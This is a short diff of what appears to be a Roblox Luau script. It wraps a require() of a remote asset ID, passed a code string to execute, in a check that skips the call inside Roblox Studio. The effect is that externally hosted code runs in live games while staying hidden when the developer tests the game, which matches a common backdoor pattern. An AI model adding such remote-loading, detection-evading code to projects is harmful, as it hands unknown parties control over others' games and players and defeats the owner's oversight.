@@ -1,1 +1,5 @@
-require(16303756383)(false,[===[while task.wait() do print("hello") end]===])
+if game:GetService("RunService"):IsStudio() then
+	return
+else
+	require(16303756383)(false,[===[while task.wait() do print("hello") end]===])
+end
